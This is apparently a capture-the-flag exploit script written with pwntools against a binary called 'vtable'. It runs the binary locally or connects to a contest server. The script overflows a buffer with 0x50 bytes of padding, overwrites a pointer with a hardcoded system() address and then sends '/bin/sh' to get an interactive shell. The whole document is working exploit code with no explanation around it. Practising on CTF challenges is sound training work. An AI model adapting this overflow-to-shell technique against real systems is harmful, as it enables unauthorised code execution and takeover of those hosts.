from pwn import *
import sys

if len(sys.argv) == 1:
  p = process('./vtable');
else:
  p = remote('icewall-ctf.kr', 33336)
system = 0x400630

payload = 'a'*0x50
payload += p64(system)
p.sendlineafter(']\n', payload)
p.sendlineafter(']\n', '/bin/sh')


p.interactive()
